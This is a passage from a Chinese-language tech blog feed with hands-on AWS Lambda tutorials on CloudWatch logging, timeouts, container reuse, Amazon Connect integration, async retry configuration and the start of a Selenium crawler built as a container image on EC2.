Stream 然後寫入日誌的功能。</p><p>當調用 Lambda的時候，會在 CloudWatch 建立包含 Lambda 名稱的Log Group，假設今天我的 Lambda 名稱叫做 <strong>TestInvocations</strong> 那日誌組的名稱就會是 <code>/aws/lambda/TestInvocations</code></p><p><img src="https://hackmd.io/_uploads/HyaWdT50h.png"></p><p>而底下就會有對應的 Log Stream</p><p><img src="https://hackmd.io/_uploads/ryBDOaqRh.png"></p><p>這裡有個有意思的地方，就是每次如果對函數進行更動或是做一些設定上的調整(Ex. 改變 Timeout 時間) 下一次調用就會產生新的 Log Stream。</p><p>因為每當你做一次新的設置，就會需要將你的設定套用到新的Sanbox 環境，也就會重新初始化新的一個 Lambda 執行環境。</p><p>如果點開 Log Stream，會發現每一次 Invocation  都會伴隨著不同的 Message，分別是：</p><ul><li>START</li><li>(Print Output, if there are any)</li><li>END</li><li>REPORT</li></ul><p>Start 到 End 這段期間代表 Lambda 正在執行，這段時間的 TimeStamp 差值也受限於你在 Lambda 上面的 Timeout 設定，可以先針對這點來做個小實驗。</p><p><img src="https://hackmd.io/_uploads/S1KPKa502.png"></p><h3 id="實驗一-Lambda-Timeout"><a href="#實驗一-Lambda-Timeout" class="headerlink" title="實驗一: Lambda Timeout"></a>實驗一: Lambda Timeout</h3><p>建立 Lambda 函數名為 <code>TestInvocation</code>, Runtimes 這裡選擇 <code>Python3.11</code>, 權限就維持預設。之後到 Lambda 主控台底下的 <strong>Code</strong> 區域編輯程式。</p><p><img src="https://hackmd.io/_uploads/SyEhzRqAh.png"></p><p>建立好 Lambda 後會給個空的 Lambda Handler，我們在這裡多 import time 並且在 handler 裏面延遲 3秒。接著按下 Test，這當中會有測試用的 JSON event，可以直接用來測試。</p><p>測試完畢後可以去 Monitor 頁面點選 “View CloudWatch logs”</p><p><img src="https://hackmd.io/_uploads/S1KUXRcRh.png"></p><p>就會跳去CloudWatch 當中對應的 Log Group，點選TimeStamp最新的 Log Stream，觀察實驗結果。</p><p><img src="https://hackmd.io/_uploads/SyeGfA90h.png"></p><p>可以發現在 Start 以及 End 中間間隔 3 秒，並且有印出 “sleep for 3 seconds”。</p><p>眼尖的人可以看到其中一個 log entry後面有顯示 “Task timed out after 3 seconds”。這是因為剛建立的 Lambda 函數，默認執行時間的timeout值會是3秒。這個可以去 Lambda 主控台上的 “Configuration” 上面修改。<br><img src="https://hackmd.io/_uploads/ry5BERqC3.png"></p><p>Timeout值的最上限會是 15分鐘。所以我們開個 15 分鐘看看，並且將 handler 當中的 delay 也調成大概 14 分鐘左右測試看看。</p><blockquote><p>這是個硬限制，也就是說你沒辦法開 Support Case 去提高額度 [8]</p></blockquote><p>等待 14分鐘過去後，可以從日誌上看到確實執行了 14分鐘<br><img src="https://hackmd.io/_uploads/H1BAq05Rn.png"></p><p>另外在先前的日誌截圖中，沒提到的是 INIT_START，這是每次初始化一個執行環境後就會有的初始化階段，初始化階段包含了 Extension Init、Runtime Init、Function Init [7]</p><p><img src="https://hackmd.io/_uploads/SkQK36qC3.png"><br><em>引用AWS 官方的圖片</em></p><p>前兩個 Init 階段偏向建立執行環境，以及啟動 Runtimes 還有下載deployment package 到執行環境等等，但到了 Function init 階段。這時候還會做一件事情，那就是會<strong>去執行 Lambda Handler 以外的程式</strong>。</p><p><img src="https://hackmd.io/_uploads/ryzXbC9Rn.png"></p><p>這裡在 handler 之外</p><p><img src="https://hackmd.io/_uploads/BJm-Z0qCn.png"></p><p>這麼說有點模糊。假設你宣告了一個全域變數在 Handler 之外，或者是你在 Lambda Handler外去與DB初始化一個連線。這些都很適合放在 Handler 之外做，並且會在 <strong>Init-Start</strong> 到 <strong>Start</strong> 這段期間執行，並且只要是持續使用相同的執行環境，那 Function Init 當中做的事也僅會做一次，這裡就會待到 Lambda 的一個特性，叫做 Container Reuse。  </p><h3 id="實驗二-Lambda-特性-容器重用（Container-Reuse）"><a href="#實驗二-Lambda-特性-容器重用（Container-Reuse）" class="headerlink" title="實驗二: Lambda 特性 - 容器重用（Container Reuse）"></a>實驗二: Lambda 特性 - 容器重用（Container Reuse）</h3><p>其實所有的容器重用的特性必須先提到， Lambda 執行環境會是容器，但一般像是 docker 的容器環境就是執行完畢就會把容器砍掉，但在 Lambda 的使用場景來看就不適合每次執行完畢就將執行環境關閉，而是繼續等待下一個調用請求。</p><p>從日誌上也可以觀察到這個特性。如果你在 Lambda 頁面上連續 invoke 三次，之後你可以在日誌中觀察到後續的調用請求，都會出現在同一個 Log Stream 當中，會接續在前一次調用日誌的後面。</p><p><img src="https://hackmd.io/_uploads/rkJu6Aq02.png"></p><p>也就是說，對於同一個 Lambda 執行環境，Lambda 完成一次執行後就接續處理下一個請求，也就是同一個 Lambda 的沙箱環境可以重新使用。</p><p>如果對於 Lambda Container Reuse 有興趣的人可以看一下這篇官方的Blog</p><blockquote><p>Understanding Container Reuse in AWS Lambda<br><a href="https://aws.amazon.com/blogs/compute/container-reuse-in-lambda/">https://aws.amazon.com/blogs/compute/container-reuse-in-lambda/</a></p></blockquote><p>這裡又有一件有意思的事，如果你是用 Lambda 主控台的測試按鈕去調用，他會等待執行完畢後，才能夠讓你再次按下測試按鈕。</p><p>如果我們用 AWS CLI 去調用 Lambda 函數，用 Terminal 一次開三個Tab同時調用我們的 Lambda 函數會發生什麼事？</p><h2 id="其他關鍵概念"><a href="#其他關鍵概念" class="headerlink" title="其他關鍵概念"></a>其他關鍵概念</h2><ul><li>Lambda 執行環境</li><li>Cold Start</li><li>Lambda 部署套件</li><li>Lambda 同步調用&#x2F;非同步調用</li><li>Lambda 的聯網功能</li></ul><h2 id="參考文獻"><a href="#參考文獻" class="headerlink" title="參考文獻"></a>參考文獻</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/welcome.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/welcome.html</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtimes.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtimes.html</a><br>[3] <a href="https://aws.amazon.com/blogs/compute/introducing-the-c-lambda-runtime/">https://aws.amazon.com/blogs/compute/introducing-the-c-lambda-runtime/</a><br>[4] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/python-handler.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/python-handler.html</a><br>[5] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html</a><br>[6] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-intro-execution-role.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-intro-execution-role.html</a><br>[7] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html#runtimes-lifecycle">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html#runtimes-lifecycle</a><br>[8] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/gettingstarted-limits.html#function-configuration-deployment-and-execution">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/gettingstarted-limits.html#function-configuration-deployment-and-execution</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>帶你從零開始整合 Lambda Function 到 Amazon Connect</title>
      <link href="/posts/5db1b7e9.html"/>
      <url>/posts/5db1b7e9.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在現代的商業環境中，提供優質且高效的客戶服務是成功的關鍵之一。<strong>Amazon Connect</strong> 是一個強大的雲端客戶服務中心，它可以幫助企業輕鬆建立高度可靠的聯絡中心，並與客戶進行無縫的互動。本篇技術部落格文章將帶領您逐步了解如何整合 Lambda Function 到 Amazon Connect，以實現更多自定義的功能。</p><p>在這篇文章中，我們將遵循以下步驟來實現整合：</p><h2 id="步驟一、建立-Connect-Instance"><a href="#步驟一、建立-Connect-Instance" class="headerlink" title="步驟一、建立 Connect Instance"></a>步驟一、建立 Connect Instance</h2><p>首先，我們將在 Amazon Connect Console 上建立一個 Connect Instance。</p><p>請至 Amazon Connect Console 上選擇 <strong>Add Instance</strong>。這個步驟會需要設定你的 <strong>instance-alias</strong>，這樣可以為你的connect instance 建立一個 unique的 Access URL</p><p><img src="https://i.imgur.com/JgeqYRX.jpg" alt="Imgur"></p><p>這個步驟是添加Admin，你會需要設定使用者名稱以及密碼。</p><p><img src="https://i.imgur.com/HqRmPC9.jpg" alt="Imgur"></p><p>之後的步驟我們就都按 <strong>Next</strong>，最後建立 Instance。</p><div class="note info flat"><p>建立會需要等一段時間，可以趁這個時候建立 Lambda Funciton</p></div><h2 id="步驟二、建立-Lambda-Function"><a href="#步驟二、建立-Lambda-Function" class="headerlink" title="步驟二、建立 Lambda  Function"></a>步驟二、建立 Lambda  Function</h2><p>前往 Lambda Console，選擇建立 Lambda Function，我們Lambda 的Region與 Connect Instance 的 Region是一樣的，都是 <code>us-east-1</code></p><p><img src="https://i.imgur.com/IF7ndGN.jpg" alt="Imgur"></p><p>我們選擇 <strong>Author from Scratch</strong>，並且給定函式名稱為 <code>TestConnect</code>，Runtime 選擇 <code>Python 3.11</code><br>接著其他都保持預設設定。最後建立 Lambda Function。</p><p>建立完成後，可以修改 Lambda code，加上一行在你的 handler上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Invoke Success!&quot;</span>)</span><br></pre></td></tr></table></figure><p>接著按下 <strong>deploy。</strong></p><h2 id="步驟三、增加Flows-到-Amazon-Connect"><a href="#步驟三、增加Flows-到-Amazon-Connect" class="headerlink" title="步驟三、增加Flows 到 Amazon Connect"></a>步驟三、增加Flows 到 Amazon Connect</h2><blockquote><p><strong>這一步驟中，我們將在 Connect Instance 中增加 Flows。我們將使用剛才建立的 Lambda Function，讓 Amazon Connect 在特定情況下調用此 Lambda 函式。</strong></p></blockquote><p>前往剛才建立的 Connect Instance，點選左側導覽欄當中的 <strong>Flows</strong></p><p><img src="https://i.imgur.com/evYMznQ.jpg" alt="Imgur"></p><p>往下找到 <strong>AWS Lambda，選擇你剛才建立的Lambda名稱，接著按下 Add Lambda Function</strong></p><p><img src="https://i.imgur.com/n7jvJGT.png?1" alt="Imgur"></p><h2 id="步驟四、設定-Contact-Flows"><a href="#步驟四、設定-Contact-Flows" class="headerlink" title="步驟四、設定 Contact Flows"></a>步驟四、設定 Contact Flows</h2><blockquote><p><strong>在這個步驟中，我們將設定 Contact Flows，讓 Amazon Connect 在特定情況下觸發 Lambda 函式並執行自定義的操作。我們將設定語音提示，以及在 Lambda 函式觸發時執行的動作。</strong></p></blockquote><p>點開你剛才建立 Connect Instance 的 Access URL</p><p><img src="https://i.imgur.com/EgmgghI.jpg" alt="Imgur"></p><p>會跳出類似這樣的畫面</p><p><img src="https://i.imgur.com/OIOj9PJ.jpg" alt="Imgur"></p><p>一樣去左側的 Panel中找到 <strong>Routing</strong>，並選擇 <strong>Flows</strong></p><p><img src="https://i.imgur.com/CkJosG1.jpg" alt="Imgur"></p><p>點開後選擇 <strong>Create Flow</strong></p><p>點開後第一步先幫你的 Flow 輸入名稱，這裡我叫做 <code>TestConnect-LambdaFlow</code><br>剛開始只會出現一個 Entry 在 畫面上，你可在做側的搜尋欄當中搜尋 Lambda Invoke，接著會出現 <strong>Invoke AWS Lambda function</strong> 的功能方塊，就把他拉到中間的畫布上。你可以先點選 Invoke AWS Lambda function 右上角的點點，並選擇 <strong>edit setting</strong>，接著右側會跳出編輯視窗，請輸入你剛才建立Lambda 函式的 ARN，接著按下 <strong>Save</strong>。</p><p><img src="https://i.imgur.com/9LBtvaI.jpg" alt="Imgur"></p><p>接著在左側搜尋欄搜尋 <strong>Play Prompt</strong> 並拉到中間畫布上，一樣點擊右上角點點，按下 <strong>edit setting</strong>。</p><p><img src="https://i.imgur.com/iskcGZZ.jpg" alt="Imgur"></p><p>選擇 Text-to&#x3D;speech or chat text 的選項，並在底下輸入客戶剛接入聊天室會出現的訊息。我在這邊輸入</p><p><code>Hi there,  this flow section will try to invoke Lambda function.</code></p><p>完成後點選 Save。</p><p>接著可以一樣在左側的搜尋欄位當中的 <strong>Terminate</strong> 找到 <strong>Disconnect</strong> 功能方塊，並把他拉到中間畫布上。</p><p>最後將所有功能方塊的箭頭連接上，整體流程會像是下面的圖一樣。</p><p><img src="https://i.imgur.com/RPBKkRu.jpg" alt="Imgur"></p><p>不管成功與否都會調用 Lambda 函式，但觸發成功才會去觸發 Prompt，而失敗就是直接結束連線，而Lambda函式調用失敗也會直接結束連線。 </p><p>最後按下 <strong>Save 完成後按下 Publish</strong></p><blockquote><p>一定要確保按下 Publish，若你沒有 Publish 你所設定的 Flow 不會出現在儀表板上</p></blockquote><h2 id="步驟五、測試-Chat"><a href="#步驟五、測試-Chat" class="headerlink" title="步驟五、測試 Chat"></a>步驟五、測試 Chat</h2><blockquote><p><strong>一旦所有設定完成，我們將進行測試。透過模擬的聊天界面，我們將檢查 Lambda 函式是否被成功觸發，以及驗證整合的運作是否符合預期。</strong></p></blockquote><p>接著一樣點選左側的 Panel 最上面有點像 Windows Logo的圖示，點選 <strong>Dashboard，回到原先的主畫面。</strong></p><p><img src="https://i.imgur.com/IL3lPpV.jpg" alt="Imgur"></p><p>點選 <strong>Test Chat</strong>，之後會跳出 Test Chat 頁面，點選左上角的 <strong>Test Settings</strong></p><p><img src="https://i.imgur.com/0EFhRCk.jpg" alt="Imgur"></p><p>點選後會出現一個設定選單，在 Contact Flow 中請選擇你剛才建立的 Flow，接著按下 <strong>Apply</strong></p><p><img src="https://i.imgur.com/sN5qfW5.jpg" alt="Imgur"></p><p>當你按下 Apply 後就會出現一個 模擬的聊天界面，並且顯示客戶加入Chat的狀況，而我們的設定是不論如何都會限結束連線。所以我們可以回到Lambda 頁面去檢查 Lambda 函式有沒有被觸發。</p><p><img src="https://i.imgur.com/1LoXmPY.jpg" alt="Imgur"></p><h2 id="步驟六、檢查日誌"><a href="#步驟六、檢查日誌" class="headerlink" title="步驟六、檢查日誌"></a>步驟六、檢查日誌</h2><blockquote><p><strong>最後，我們將檢查 Lambda 函式的日誌，以確認 Lambda 是否被正確調用，並確保整合的可靠性。</strong></p></blockquote><p>回到 Lambda Console 點選 <strong>View CloudWatch logs</strong></p><p><img src="https://i.imgur.com/C5ziVSW.jpg" alt="Imgur"></p><p>點開最新產生的 Log Streams，可以發現 <code>Invoke Success!</code> 的字串，由此得知我們的 Lambda 被成功調用了</p><p><img src="https://i.imgur.com/xzwSbUl.jpg" alt="Imgur"></p><h2 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h2><p>透過這篇文章，您將學會如何使用 Amazon Connect 和 Lambda Function 整合客戶服務的流程，並實現自定義的客戶互動。讓我們一起踏出這個整合之旅吧！</p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Lambda </tag>
            
            <tag> Connect </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>⚙️在 Lambda 上設定錯誤重試 (Retry)</title>
      <link href="/posts/d400aff3.html"/>
      <url>/posts/d400aff3.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一樣是解 case 碰到的問題，但我也沒真的在 Lambda 設定過重試 (Retry)，這次就秉持著實驗精神來在自己的環境實驗看看。</p><p>Lambda 當中的錯誤重試通常是用於當<strong>非同步調用(Asynchronous Invocations)</strong> 失敗後重新發送調用請求的行為。針對非同步調用，Lambda 會將事件置放在 Queue 當中，並傳回成功回應，其中不包含其他資訊。單獨的程序會從 Queue 讀取事件，並將事件傳送到您的函數</p><p><img src="https://i.imgur.com/wn1vCQu.png" alt="Imgur"></p><blockquote><p>圖片用 ZenUML 建立的<br><a href="https://app.zenuml.com/">https://app.zenuml.com/</a><br><a href="https://mermaid.js.org/syntax/zenuml.html">https://mermaid.js.org/syntax/zenuml.html</a></p></blockquote><h2 id="建立-Lambda"><a href="#建立-Lambda" class="headerlink" title="建立 Lambda"></a>建立 Lambda</h2><p>這邊建立 Lambda部分很簡單，就建立一個名叫 <strong>TestInvocations</strong> 的 function，使用的 Runtime 是 <code>NodeJS.14.x</code></p><h2 id="修改-Lambda-Handler-程式"><a href="#修改-Lambda-Handler-程式" class="headerlink" title="修改 Lambda Handler 程式"></a>修改 Lambda Handler 程式</h2><p>在 Lambda Console主頁底下的 <strong>Code</strong> 區域來修改程式，更改 <code>index.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> outside = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">handler</span> = <span class="function">(<span class="params">event, context, callback</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="string">&#x27;RequestId&#x27;</span>: context.<span class="property">awsRequestId</span>,</span><br><span class="line">        <span class="string">&#x27;outside&#x27;</span>: outside++</span><br><span class="line">    &#125;)); </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;retry test&#x27;</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一但修改完畢後，可以點選 <strong>deploy</strong> ，來上傳修改好的程式</p><p><img src="https://i.imgur.com/3XJYyyo.jpg" alt="Imgur"></p><h2 id="設定重試"><a href="#設定重試" class="headerlink" title="設定重試"></a>設定重試</h2><p>我們可以去 Lambda Console 的主頁去 <strong>Configuration</strong> 頁面選擇 <strong>Asynchronous Invocation</strong> ，接著去 Edit</p><p><img src="https://i.imgur.com/uVM6U6E.jpg" alt="Imgur"></p><p><strong>Retry attempts</strong> 最多能夠設到 <code>2</code>，在你的 Lambda Function 接收非同步叫用後發生錯誤，並重試兩次後，該 Event 就會被拋棄，但也可以額外設定 <strong>Dead Letter Queue (DLQ)</strong> 來去存放來被捨棄的事件，以供後續處理。</p><blockquote><p>細節可以參考這份官方文件: <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html#invocation-dlq">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html#invocation-dlq</a></p></blockquote><h2 id="觸發Lambda"><a href="#觸發Lambda" class="headerlink" title="觸發Lambda"></a>觸發Lambda</h2><p>接著可以透過 <strong>AWS CLI (Command Line Tool)</strong> 來去調用 Lambda 函式</p><blockquote><p>沒有設定過 AWS CLI 的可以參考這份文件來進行設置 &gt;&gt; <a href="https://aws.amazon.com/cli/">https://aws.amazon.com/cli/</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke --function-name TestInvocations --invocation-type Event test.txt</span><br></pre></td></tr></table></figure><p>這邊設定 <code>--invocation-type</code> 為 Event，這麼代表你是以非同步的方式來調用 Lambda。</p><p>接著會回傳狀態碼 <code>202</code>   這是代表，你的請求已被 Lambda 接受，但還不會馬上處理 （畢竟是非同步）</p><blockquote><p>參考資料:<br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/API_Invoke.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/API_Invoke.html</a></p></blockquote><div class="note info flat"><p>對於 Lambda 同步以及非同步調用，可以個別參考對應的官方文件說明<br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html</a><br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-sync.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-sync.html</a><br>至於在架構上的異同，以後可以再寫一篇文章來整理！</p></div><h2 id="觀測結果"><a href="#觀測結果" class="headerlink" title="觀測結果"></a>觀測結果</h2><p>之後我們可以到 Lambda Console 上面的 <strong>Monitor</strong> 頁面，點選 View <strong>CloudWatch logs</strong> 選項，這時候就會跳出 Cloudwatch Logs 的主頁</p><p><img src="https://i.imgur.com/aOskbVm.jpg" alt="Imgur"><br><img src="https://i.imgur.com/EKlsnSl.jpg" alt="Imgur"></p><p>當你每次建立 Lambda 時，預設會給予Lambda 的執行角色一個名叫 <code>AWSBasicExecutionRole</code> 的政策，其中包含了建立Cloudwatch Log Group 還有 Cloudwatch Log 的權限，並且會建立 <code>/aws/lambda/&lt;你的Lambd名稱&gt;</code> 的這麼一個<strong>日誌組（Log Group）</strong>，在這個日誌組底下會有許多<strong>日誌流（Log Stream）</strong>，每當你<br>對你的Lambda函式進行變更並重新觸發Function，就會產生新的日誌流</p><p><img src="https://i.imgur.com/JSuUpCk.jpg" alt="Imgur"></p><p>此時我們選擇最新的日誌流，可以發現有三筆 invocation，第一筆為我們觸發的，第二以及第三則是我們設定的重試觸發</p><p>觸發請求-1<br><img src="https://i.imgur.com/OMHbzV7.jpg" alt="Imgur"><br>Retry-1<br><img src="https://i.imgur.com/gmvSuMn.jpg" alt="Imgur"><br>Retry-2<br><img src="https://i.imgur.com/mbniv78.jpg" alt="Imgur"></p><p>這裡就可以觀察到，invocation後的日誌可以看到錯誤訊息，並且在第一次請求錯誤後過一分鐘會重試一次，在第一次重試失敗後過兩分鐘會去重試第二次，接著就不會再去重試了。這邊也觀察到錯誤重試時的 request id 跟原本的一樣，應該可以試著用這個當判斷是否為錯誤重試、事件是否已經處理過。</p><h2 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h2><p>在 開發 Lambda 程式以及進行相關設定時，務必要注意 調用的類型以及對應的設定有哪些，才不會傻傻的混用而不自知。</p><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p><a href="https://azole.medium.com/aws-lambda-reuse-and-retry-behavior-ffaac616d869">https://azole.medium.com/aws-lambda-reuse-and-retry-behavior-ffaac616d869</a><br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-retries.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-retries.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Amazon </tag>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🐞透過 Amazon Lambda 實踐 Web Crawler</title>
      <link href="/posts/6dbe323f.html"/>
      <url>/posts/6dbe323f.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>這篇文章是在重現客戶問題時候的的實踐，原先為了解決客戶的問題，我試著想要安裝 <strong>Selenium Chromedriver</strong> 以及 <strong>BeautifulSoup</strong> ，打包成 Lambda Layer 並建立基於該Layer的Lambda，但一直出現 Chromedriver 找不到檔案的錯誤，左踩坑又踩坑的troubleshooting 突然這篇救星 <a href="https://stackoverflow.com/questions/69047401/selenium-docker-container-runs-on-ec2-but-not-on-aws-lambda">https://stackoverflow.com/questions/69047401/selenium-docker-container-runs-on-ec2-but-not-on-aws-lambda</a> ，根據這篇文章以及相對應的 github <a href="https://github.com/rchauhan9/image-scraper-lambda-container/tree/master%EF%BC%8C%E4%B8%8A%E9%9D%A2%E4%B8%BB%E8%A6%81%E6%98%AF%E4%BB%A5">https://github.com/rchauhan9/image-scraper-lambda-container/tree/master，上面主要是以</a> Container Image 的方式來建立 Lambda ，但要這麼做之前會先將需要的套件跟環境打包成 Image。</p><p>但由於公司的 Mac 不能安裝 Docker，因此我先開個 EC2 來進行大部分操作</p><div class="note alert flat"><p>本篇文章的範例以及建構所需知識皆參考自AWS官方文件</p></div><p>所有流程大概如下</p><div class="note info flat"><p>這邊透過 mermaid 繪製流程圖是參考這篇部落格以及官方文檔的教學<br><a href="https://shannonhung.github.io/posts/first-blog.html#%E5%89%8D%E8%A8%80">https://shannonhung.github.io/posts/first-blog.html#%E5%89%8D%E8%A8%80</a><br><a href="https://mermaid.js.org/syntax/flowchart.html">https://mermaid.js.org/syntax/flowchart.html</a></p></div><div class="mermaid-wrap"><pre class="mermaid-src" hidden>    graph LR   A(建立及設定EC2) --&gt; B(設定VPC)    B(設定VPC) --&gt; C(連接EC2)   C(連接EC2) --&gt; D(安裝Docker)   D(安裝Docker) --&gt; E(建構鏡像)   E(建構鏡像) --&gt;  F(測試容器)   F(測試容器) --&gt; G(推上儲存庫)   G(推上儲存庫) --&gt; H(建構Lambda)  </pre></div><h2 id="安裝-EC2"><a href="#安裝-EC2" class="headerlink" title="安裝 EC2"></a>安裝 EC2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Name: TestWebScrapping</span><br><span class="line">AMI: Amazon Linux 2</span><br><span class="line">Region: us-east-1</span><br><span class="line">Access Key: &quot;CWAccess.pem&quot;</span><br></pre></td></tr></table></figure><h2 id="設定網路"><a href="#設定網路" class="headerlink" title="設定網路"></a>設定網路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">IPv4 CIDR: 10.1.0.0/16</span><br><span class="line"></span><br><span class="line">Subnet: TestSubnet1</span><br><span class="line">CIDR: 10.1.0.0/24</span><br><span class="line">RouteTable: </span><br><span class="line">10.1.0.0/16   |  local</span><br><span class="line">0.0.0.0/0     |  Internet Gateway</span><br><span class="line"></span><br><span class="line">Security Group</span><br><span class="line">TCP 443 Source: 0.0.0.0/0</span><br><span class="line">TCP 80 Source: 0.0.0.0/0</span><br><span class="line">TCP 22 Source: 0.0.0.0/0</span><br></pre></td></tr></table></figure><h2 id="創建完畢後連接到-EC2"><a href="#創建完畢後連接到-EC2" class="headerlink" title="創建完畢後連接到 EC2"></a>創建完畢後連接到 EC2</h2><p><img src="https://i.imgur.com/ZQwGuqY.jpg" alt="Imgur"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i &quot;CWAccess.pem&quot; ec2-user@ec2-3-83-139-226.compute-1.amazonaws.com</span><br></pre></td></tr></table></figure><h2 id="安裝-Docker"><a href="#安裝-Docker" class="headerlink" title="安裝 Docker"></a>安裝 Docker</h2><p>這邊的安裝文件可以參考aws的官方指引<br><a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/create-container-image.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/create-container-image.html</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo yum update -y</span><br><span class="line">sudo amazon-linux-extras install docker</span><br><span class="line">sudo service docker start</span><br><span class="line">sudo usermod -a -G docker ec2-user</span><br><span class="line"></span><br><span class="line">此時重新登入Terminal</span><br><span class="line">docker info</span><br></pre></td></tr></table></figure><h2 id="建構-Docker-Image"><a href="#建構-Docker-Image" class="headerlink" title="建構 Docker Image"></a>建構 Docker Image</h2><p>在家目錄中先新增幾項檔案：</p><ul><li>requirements.txt</li><li>entry.sh</li><li>app&#x2F;app.y</li></ul><p>requirements.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">requests==2.25.0</span><br><span class="line">selenium==3.14.0</span><br><span class="line">beautifulsoup4==4.9.3</span><br><span class="line">Pillow==8.0.1</span><br><span class="line">boto3</span><br><span class="line">botocore</span><br></pre></td></tr></table></figure><p>entry.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$&#123;AWS_LAMBDA_RUNTIME_API&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">exec</span> /usr/bin/aws-lambda-rie /usr/local/bin/python -m awslambdaric <span class="variable">$1</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">exec</span> /usr/local/bin/python -m awslambdaric <span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>給予執行權限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x entry.sh</span><br></pre></td></tr></table></figure><p>app&#x2F;app.py</p><figure 